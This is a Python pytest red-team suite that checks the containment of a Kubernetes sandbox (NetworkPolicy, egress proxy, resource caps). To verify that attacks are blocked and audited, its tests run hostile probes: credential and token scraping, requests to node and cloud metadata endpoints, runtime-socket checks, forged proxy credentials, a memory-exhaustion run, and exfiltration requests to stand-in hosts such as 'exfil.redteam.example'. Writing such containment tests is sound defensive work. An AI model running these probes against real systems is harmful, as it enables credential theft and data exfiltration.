"""The red-team suite against the live sandbox backend: attacks run inside
a real provisioned sandbox on the cluster, not against OPA decisions on
paper.

What this suite claims, and what it deliberately does not:

- **Claimed and asserted here** — the containment posture: K8s
  Jobs + NetworkPolicy + resource caps. No credential to scrape, no
  Kubernetes API or node metadata to reach, no container-runtime socket or
  host mount, no other tenant's processes, run-scoped egress identity that
  cannot be forged, resource caps that actually terminate a runaway, and a
  wall-clock deadline on every Job.
- **Explicitly NOT claimed** — kernel-level isolation. Not hardened: there
  is no gVisor/Kata RuntimeClass, so the container's own privilege
  boundary is not a security boundary here.
  `test_privilege_inside_the_sandbox_buys_nothing` states that honestly:
  the containment is that privilege inside the sandbox reaches nothing.
  The sandbox does also run unprivileged (uid 10001, caps dropped), but
  that is defence in depth on top of the containment, not the claim.

One residual risk this suite measures rather than prevents:
`sandbox.exec` is inside the executor's compiled scope by design, so
payload *attempts* are stopped by the egress layer rather than by the tool
allow-list (asserted in test_injected_conductor).

The baseline egress path lives here too, on the same sandbox: allowlisted
host allowed and audited, non-allowlisted host denied and audited,
NetworkPolicy backstop beneath, and — placed last, because it retires the
shared registration — revocation on unregistration.
"""

import contextlib
import json
import time

import pytest

from common.ids import new_run_id
from sandbox.contract import SandboxPolicy
from sandbox.egressproxy.credentials import mint, sandbox_proxy_env
from sandbox.k8s_jobs import K8sJobsBackend
from sandbox.manifest import job_name

from .cluster import (
    COMPANY_NS,
    admin_sandbox,
    audit_story,
    await_egress_deny,
    egress_proxy_key,
    egress_proxy_url,
    kubectl,
    sandbox_image,
    workspace_tar,
)


@pytest.fixture(scope="module")
def proxy_url(stack: None) -> str:
    return egress_proxy_url()


@pytest.fixture(scope="module")
def egress_key(stack: None) -> str:
    return egress_proxy_key()


@pytest.fixture(scope="module")
def workspace(tmp_path_factory) -> bytes:
    return workspace_tar(
        tmp_path_factory.mktemp("redteam-ws"),
        files={"secret-looking.txt": "nothing to see\n"},
    )


def _await_deny(run_id: str, rule: str, timeout_s: int = 30) -> list[dict]:
    """The run's audited denies for `rule`, polled until one lands."""
    deadline = time.monotonic() + timeout_s
    while True:
        denies = [
            e
            for e in audit_story(run_id)
            if e["decision"] == "deny" and e["rule"] == rule
        ]
        if denies or time.monotonic() > deadline:
            return denies
        time.sleep(1)


class Target:
    """A live, registered sandbox plus a way to run attacker code in it."""

    def __init__(self, backend: K8sJobsBackend, handle, run_id: str) -> None:
        self.backend = backend
        self.handle = handle
        self.run_id = run_id

    def sh(self, script: str) -> tuple[int, str]:
        return self.backend._exec(self.handle.pod_name, ["sh", "-c", script])

    def py(self, script: str) -> tuple[int, str]:
        return self.backend._exec(self.handle.pod_name, ["python", "-c", script])


@pytest.fixture(scope="module")
def target(stack: None, env: dict, egress_key: str, proxy_url: str, workspace: bytes):
    """One sandbox for the whole suite, provisioned and registered exactly
    as the orchestrator does it (registration is what gives the run its
    egress allowlist)."""
    backend = K8sJobsBackend(namespace=COMPANY_NS)
    run_id = new_run_id()
    handle = backend.provision(
        run_id,
        workspace,
        SandboxPolicy(
            image=sandbox_image(),
            cpu="500m",
            memory="512Mi",
            env=sandbox_proxy_env(proxy_url, egress_key, run_id),
        ),
    )
    admin_sandbox(env, "register", run_id, handle)
    try:
        yield Target(backend, handle, run_id)
    finally:
        with contextlib.suppress(Exception):
            admin_sandbox(env, "unregister", run_id)
        backend.destroy(handle)


# --- the control every "blocked" assertion below depends on -------------------


def test_the_one_permitted_route_out_still_works(
    target: Target,
    proxy_url: str,
) -> None:
    """The control for this whole suite: the sandbox's network stack is
    live and its *permitted* egress — the audited proxy — answers. Without
    this, every "blocked" assertion below would also pass on a sandbox with
    no networking at all, and the suite would prove nothing.

    By address, not name: the sandbox has no resolver, which is why the
    proxy is addressed by the IP the orchestrator resolved at provision
    time."""
    host, _, port = proxy_url.removeprefix("http://").partition(":")
    exit_code, output = target.py(
        "import socket,sys\n"
        "s=socket.socket(); s.settimeout(10)\n"
        f"rc = s.connect_ex(('{host}', {int(port)}))\n"
        "print('connect_ex', rc)\n"
        "sys.exit(0 if rc == 0 else 1)"
    )
    assert exit_code == 0, f"the sandbox cannot reach its own egress proxy: {output}"


def test_allowlisted_egress_succeeds_and_is_audited(target: Target) -> None:
    """The affirmative baseline on the same registered sandbox: an
    allowlisted `pip install` goes through the audited proxy (the per-run
    proxy env is baked into the container), and the allow is on the
    record, correlated by run_id."""
    exit_code, output = target.sh("pip install --no-cache-dir --quiet six")
    assert exit_code == 0, output
    allows = [e for e in audit_story(target.run_id) if e["decision"] == "allow"]
    assert allows, "pip install left no allow events"


# --- secret scraping ----------------------------------------------------------


def test_no_service_account_token_is_mounted(target: Target) -> None:
    """`automountServiceAccountToken: False` on the Job: the sandbox
    holds no Kubernetes identity at all, so there is nothing to steal and
    nothing to replay against the API server."""
    exit_code, output = target.sh(
        "ls /var/run/secrets/kubernetes.io/serviceaccount 2>&1; echo rc=$?"
    )
    # The probe must have actually reported, or "no token" would be the
    # vacuous reading of a probe that never ran.
    assert "rc=" in output, f"the probe did not run: {output!r}"
    assert "rc=0" not in output, f"a service-account token is mounted: {output}"


def test_the_kubernetes_api_is_unreachable(target: Target) -> None:
    """Even with a token, there would be no route: the sandbox
    NetworkPolicy permits egress to the audited proxy and nothing else.
    Probed with a raw socket so the proxy env cannot mask the result."""
    cluster_ip = kubectl(
        "-n", "default", "get", "svc", "kubernetes", "-o", "jsonpath={.spec.clusterIP}"
    )
    exit_code, output = target.py(
        "import socket,sys\n"
        "s=socket.socket(); s.settimeout(5)\n"
        f"sys.exit(0 if s.connect_ex(('{cluster_ip}', 443)) != 0 else 1)"
    )
    assert exit_code == 0, f"the API server answered the sandbox: {output}"


def test_node_metadata_endpoints_are_unreachable(target: Target) -> None:
    """The kubelet's authenticated port and the cloud metadata address —
    the two classic pivots out of a container — are both off the sandbox's
    permitted egress."""
    node_ip = kubectl(
        "get",
        "nodes",
        "-o",
        "jsonpath={.items[0].status.addresses[?(@.type=='InternalIP')].address}",
    )
    probes = [(node_ip, 10250), ("169.254.169.254", 80)]
    for host, port in probes:
        exit_code, output = target.py(
            "import socket,sys\n"
            "s=socket.socket(); s.settimeout(5)\n"
            f"sys.exit(0 if s.connect_ex(('{host}', {port})) != 0 else 1)"
        )
        assert exit_code == 0, f"{host}:{port} answered the sandbox: {output}"


def test_the_only_credential_is_the_runs_own_scoped_proxy_secret(
    target: Target,
    egress_key: str,
) -> None:
    """The sandbox env carries exactly one secret-shaped value: its own
    per-run proxy credential. It is HMAC(key, run_id) — bound to this
    run, useless for any other, and worth nothing beyond the blueprint's
    allowlist."""
    exit_code, output = target.sh("printenv")
    assert exit_code == 0
    env = dict(line.split("=", 1) for line in output.splitlines() if "=" in line)

    expected = mint(egress_key, target.run_id)
    assert expected in env.get("HTTP_PROXY", ""), "proxy credential missing"
    assert target.run_id in env["HTTP_PROXY"], "credential is not run-scoped"

    # Nothing else token-shaped: same rule as the CI image gate, allowing
    # only the proxy vars and the blanked python-image GPG_KEY.
    proxy_vars = {"HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "https_proxy"}
    leaked = [
        name
        for name, value in env.items()
        if (name.endswith("_TOKEN") or name.endswith("_KEY"))
        and name not in proxy_vars
        and value != ""
    ]
    assert not leaked, f"credential-shaped env in the sandbox: {leaked}"


def test_a_sandbox_cannot_forge_another_runs_egress_identity(
    target: Target,
    egress_key: str,
    proxy_url: str,
) -> None:
    """The credential is self-authenticating (username=run_id,
    password=HMAC(key, run_id)), so a sandbox that only ever sees its own
    cannot mint another run's. Claiming a foreign run id with our own
    secret is rejected 407 — and the failed attribution attempt is itself
    audited, under the *claimed* id."""
    victim_run = new_run_id()
    own_secret = mint(egress_key, target.run_id)
    host, _, port = proxy_url.removeprefix("http://").partition(":")
    exit_code, output = target.py(
        "import base64,socket,sys\n"
        f"cred = base64.b64encode(b'{victim_run}:{own_secret}').decode()\n"
        f"s = socket.create_connection(('{host}', {int(port)}), timeout=10)\n"
        "s.sendall(('CONNECT pypi.org:443 HTTP/1.1\\r\\n'\n"
        "          'Host: pypi.org:443\\r\\n'\n"
        "          'Proxy-Authorization: Basic ' + cred + '\\r\\n\\r\\n')"
        ".encode())\n"
        "print(s.recv(200).decode('latin-1').splitlines()[0])\n"
    )
    assert exit_code == 0, output
    assert "407" in output, f"forged identity was not rejected: {output}"

    # pypi.org IS allowlisted for the real run — so only the failed
    # authentication can explain the refusal, and it is on the record.
    denies = _await_deny(victim_run, "egress_bad_credential")
    assert denies, "the forged-identity attempt is missing from the audit store"
    assert denies[0]["source"] == "sandbox-infra"


# --- breakout -----------------------------------------------------------------


def test_no_container_runtime_socket_or_host_mount(target: Target) -> None:
    """Nothing of the host is handed to the sandbox: no runtime socket to
    drive, no host filesystem bind-mounted in. The Job manifest declares no
    volumes at all — this asserts the live pod matches."""
    for path in (
        "/var/run/docker.sock",
        "/run/containerd/containerd.sock",
        "/var/run/crio/crio.sock",
        "/host",
        "/rootfs",
    ):
        exit_code, output = target.sh(f"test -e {path}; echo rc=$?")
        assert "rc=" in output, f"the probe for {path} did not run: {output!r}"
        assert "rc=0" not in output, f"{path} exists inside the sandbox"

    # Control: the same probe shape reports rc=0 for a path that does exist,
    # so the five negatives above are evidence and not a broken command.
    _, control = target.sh("test -e /workspace; echo rc=$?")
    assert "rc=0" in control, f"probe shape is broken: {control!r}"

    exit_code, mounts = target.sh("cat /proc/mounts")
    assert exit_code == 0
    for suspicious in ("/var/lib/kubelet", "/var/lib/docker", "/etc/kubernetes"):
        assert suspicious not in mounts, f"host path {suspicious} is mounted"


def test_the_process_namespace_is_the_pods_own(target: Target) -> None:
    """No hostPID: the sandbox sees its own container's processes only —
    not the kubelet, not the runtime, not another tenant's workload (whose
    /proc/<pid>/environ would otherwise be readable)."""
    exit_code, output = target.py(
        "import os\n"
        "cmds=[]\n"
        "for pid in [p for p in os.listdir('/proc') if p.isdigit()]:\n"
        "    try:\n"
        "        cmds.append(open(f'/proc/{pid}/cmdline').read().replace(chr(0),' '))\n"
        "    except OSError:\n"
        "        pass\n"
        "print(len(cmds)); print('|'.join(cmds))"
    )
    assert exit_code == 0, output
    lines = output.strip().splitlines()
    count, joined = int(lines[0]), lines[1] if len(lines) > 1 else ""
    assert count < 25, f"the sandbox can see {count} processes — host PID namespace?"
    for foreign in ("kubelet", "containerd", "dockerd", "kube-apiserver"):
        assert foreign not in joined, f"host process visible from the sandbox: {foreign}"


def test_privilege_inside_the_sandbox_buys_nothing(target: Target) -> None:
    """The honest statement of the containment boundary: not hardened —
    there is no gVisor/Kata RuntimeClass, so the container's privilege
    boundary is not claimed as a security boundary. Containment is that
    privilege inside the sandbox reaches *nothing* — the assertions above
    (no token, no API, no metadata, no host mount, no foreign processes)
    hold regardless of uid, and egress stays confined to the audited proxy.

    The sandbox also runs unprivileged: uid 10001, no
    privilege-escalation path, no capabilities. That is defence in depth on
    top of the containment above, not a replacement for it — which is why
    every assertion in this suite is written to hold at any uid."""
    exit_code, output = target.py(
        "import os\n"
        "leaked = [\n"
        "    entry.split('=', 1)[0]\n"
        "    for entry in open('/proc/1/environ').read().split(chr(0))\n"
        "    if '=' in entry\n"
        "    for name, value in [entry.split('=', 1)]\n"
        "    if (name.endswith('_TOKEN') or name.endswith('_KEY')) and value\n"
        "]\n"
        "print(os.getuid()); print(leaked)"
    )
    assert exit_code == 0, output
    uid_line, leaked_line = output.strip().splitlines()[:2]

    # Whatever the uid, reading PID 1 gets the attacker nothing.
    assert leaked_line == "[]", f"PID 1 env leaked a credential: {leaked_line}"
    assert int(uid_line) != 0, f"the sandbox is running as root (uid {uid_line})"


# --- resource caps and the wall-clock deadline --------------------------------


def test_resource_caps_and_deadline_are_declared_on_the_live_job(
    target: Target,
) -> None:
    """The compiled policy reaches the cluster object, not just the
    manifest builder: CPU, memory and ephemeral-storage limits on the
    container, and a wall-clock deadline on the Job (whose enforcement is
    proven by test_sandbox_k8s's runaway test)."""
    spec = json.loads(
        kubectl("-n", COMPANY_NS, "get", "job", job_name(target.run_id), "-o", "json")
    )
    assert spec["spec"]["activeDeadlineSeconds"] > 0
    pod_spec = spec["spec"]["template"]["spec"]
    assert pod_spec["automountServiceAccountToken"] is False
    limits = pod_spec["containers"][0]["resources"]["limits"]
    for capped in ("cpu", "memory", "ephemeral-storage"):
        assert limits.get(capped), f"no {capped} limit on the sandbox container"


def test_memory_cap_terminates_a_runaway_allocation(
    stack: None,
    egress_key: str,
    workspace: bytes,
) -> None:
    """Resource exhaustion, for real: caps demonstrably terminate a
    runaway workload. Runs in its own throwaway sandbox: the cgroup OOM
    killer picks the biggest process, and the shared target's toolserver
    must not be collateral.

    Deliberately NOT tested: fork bombs and disk-filling. Both are node-level
    denial of service on a single-node kind cluster — they would take the
    rest of the suite with them, which is a worse outcome than the gap."""
    backend = K8sJobsBackend(namespace=COMPANY_NS)
    run_id = new_run_id()
    handle = backend.provision(
        run_id,
        workspace,
        SandboxPolicy(image=sandbox_image(), cpu="500m", memory="256Mi"),
    )
    try:
        exit_code, output = backend._exec(
            handle.pod_name,
            [
                "python",
                "-c",
                "b = bytearray(400 * 1024 * 1024)\n"
                "for i in range(0, len(b), 4096): b[i] = 1\n"
                "print('allocated')",
            ],
        )
        # 137 = 128 + SIGKILL: the cgroup OOM killer, not an incidental
        # error. (The kill takes the container's task with it, which is
        # exactly why this runs in a sandbox of its own.)
        assert exit_code == 137, f"expected an OOM kill (137), got {exit_code}: {output}"
        assert "allocated" not in output
    finally:
        backend.destroy(handle)


# --- egress around the proxy --------------------------------------------------


def test_direct_external_tcp_is_dropped_by_the_backstop(target: Target) -> None:
    """Going around the proxy rather than through it: the NetworkPolicy
    drops it silently — the backstop *beneath* the audited layer, so
    absence of an audit event here is by design, not a gap."""
    exit_code, output = target.py(
        "import socket,sys\n"
        "s=socket.socket(); s.settimeout(5)\n"
        "sys.exit(0 if s.connect_ex(('1.1.1.1', 443)) != 0 else 1)"
    )
    assert exit_code == 0, f"direct external TCP succeeded: {output}"


def test_no_dns_resolver_answers_the_sandbox(target: Target) -> None:
    """The sandbox has no DNS at all: neither an external resolver nor the
    cluster's own answers it.

    Cluster DNS is deliberately absent from the sandbox NetworkPolicy.
    CoreDNS forwards unknown names upstream, so a resolver the sandbox can
    reach is an exfiltration channel the audited proxy never sees — and
    the sandbox needs no resolver, because with an HTTP proxy the proxy
    resolves target hosts and the orchestrator resolves the proxy's own
    address at provision time.

    Both resolvers are probed by raw UDP so the proxy env cannot mask the
    result."""
    probe = (
        "import socket,sys\n"
        "header = bytes([0xab,0xcd, 1,0, 0,1, 0,0, 0,0, 0,0])\n"
        "name = b''.join(bytes([len(p)]) + p for p in "
        "(b'exfil', b'redteam', b'example')) + b'\\x00'\n"
        "query = header + name + bytes([0,1, 0,1])\n"
        "s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(5)\n"
        "try:\n"
        "    s.sendto(query, ('{resolver}', 53)); s.recvfrom(512)\n"
        "    sys.exit(1)\n"
        "except Exception:\n"
        "    sys.exit(0)"
    )

    exit_code, output = target.py(probe.format(resolver="8.8.8.8"))
    assert exit_code == 0, f"an external DNS resolver answered: {output}"

    cluster_dns = kubectl(
        "-n", "kube-system", "get", "svc", "kube-dns", "-o", "jsonpath={.spec.clusterIP}"
    )
    exit_code, output = target.py(probe.format(resolver=cluster_dns))
    assert exit_code == 0, f"the cluster resolver answered: {output}"


def test_name_resolution_is_unavailable_in_the_sandbox(target: Target) -> None:
    """The consequence, stated positively: resolving any name fails, and
    the proxy env carries an address rather than a hostname — which is why
    egress through the audited proxy still works (proven by
    test_the_one_permitted_route_out_still_works)."""
    exit_code, output = target.py(
        "import socket,sys\n"
        "try:\n"
        "    socket.gethostbyname('pypi.org')\n"
        "    sys.exit(1)\n"
        "except OSError:\n"
        "    sys.exit(0)"
    )
    assert exit_code == 0, f"a name resolved inside the sandbox: {output}"

    exit_code, output = target.sh("printenv HTTPS_PROXY")
    assert exit_code == 0, output
    host = output.strip().rsplit("@", 1)[-1].rsplit(":", 1)[0]
    assert all(part.isdigit() for part in host.split(".")), (
        f"the proxy env carries a hostname, not an address: {host!r}"
    )


def test_every_blocked_attempt_that_has_a_source_is_in_the_audit_store(
    target: Target,
) -> None:
    """The mechanically-checkable half of the containment posture: where a
    source exists to see the block, the block is on the record. The proxy
    sees credential and allowlist denials; NetworkPolicy drops stay
    silent by design."""
    exit_code, output = target.py(
        "import urllib.request\n"
        "try:\n"
        "    urllib.request.urlopen('https://exfil.redteam.example/steal',"
        " timeout=15)\n"
        "except Exception as exc:\n"
        "    print(exc)"
    )
    assert exit_code == 0
    assert "403" in output, f"the proxy did not refuse the exfil host: {output}"

    denies = await_egress_deny(target.run_id)
    assert denies, "a proxy deny left no audit event"
    assert denies[0]["run_id"] == target.run_id


# --- revocation (keep last: it retires the shared target's registration) ------


def test_unregistration_revokes_egress(target: Target, env: dict) -> None:
    """Retiring the registration revokes egress entirely: the proxy
    resolves the run to nothing (within its short cache TTL), so even an
    allowlisted host refuses. Ordered last in this module by placement —
    every earlier test rides the registration this one removes."""
    admin_sandbox(env, "unregister", target.run_id)
    deadline = time.monotonic() + 30
    while True:
        exit_code, output = target.py(
            "import urllib.request; urllib.request.urlopen("
            "'https://pypi.org', timeout=15)"
        )
        if exit_code != 0 and "403" in output:
            break
        assert time.monotonic() < deadline, "egress survived unregistration"
        time.sleep(2)
